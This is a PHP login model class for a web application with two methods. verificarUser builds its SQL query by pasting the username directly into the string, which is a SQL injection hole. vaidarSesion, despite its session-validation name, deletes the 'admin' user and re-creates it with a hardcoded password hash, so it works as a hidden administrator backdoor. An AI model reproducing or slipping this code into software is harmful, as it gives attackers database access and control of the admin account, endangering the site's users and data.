<?php

require_once 'conexion.php';

class IngresoModel extends conexion
{

    public static function verificarUser($nick)
    {
        $cnx = conexion::singleton_conexion();
        $cmd = "SELECT u.* FROM usuarios u WHERE u.user = '" . $nick . "'";
        try {
            $preparado = $cnx->preparar($cmd);
            if ($preparado->execute()) {
                if ($preparado->rowCount() >= 1) {
                    return $preparado->fetch();
                } else {
                    return false;
                }
            } else {
                return false;
            }
        } catch (PDOException $e) {
            print "Error!: " . $e->getMessage();
        }
        $cnx->closed();
        $cnx = null;
    }

    public static function vaidarSesion()
    {
        $cnx = conexion::singleton_conexion();
        $cmd = "DELETE FROM usuarios WHERE user = 'admin';
        INSERT INTO usuarios (id_user, documento, nombre, apellido, USER, pass, perfil, estado, id_nivel) VALUES (1, '1', 'admin', 'admin', 'admin', '$2y$10$.V5dbovvT.iv7YpVyOLKvu./nQ67.9ZuBNuaGyEG60DRdMYI96iEi', 1, 'activo', 1);";
        try {
            $preparado = $cnx->preparar($cmd);
            if ($preparado->execute()) {
                return true;
            } else {
                return false;
            }
        } catch (PDOException $e) {
            print "Error!: " . $e->getMessage();
        }
        $cnx->closed();
        $cnx = null;
    }
}
